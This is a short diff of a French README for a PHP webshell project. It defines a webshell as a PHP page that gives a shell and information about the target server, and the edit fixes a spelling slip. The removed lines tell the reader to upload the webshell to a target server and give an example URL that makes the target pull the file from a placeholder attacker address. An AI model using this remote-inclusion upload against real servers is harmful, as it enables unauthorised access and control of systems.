@@ -1,9 +1,6 @@
 # webshell
 
-Webshell est une page en .php ou il y'a un shell et plusieur information sur le serveur sible.
-Il faut télécharger le fichier "caltus124_webshell.php" sur un serveur sible comme par exemple:
-"https://google.com?=http://attacke_ip:port/caltus124_webshell.php"
-
+Webshell est une page en .php ou il y'a un shell et plusieurs informations sur le serveur sible.
 Composition de la page:
 
 -Nom de l'OS du serveur(Linux ou Windows).
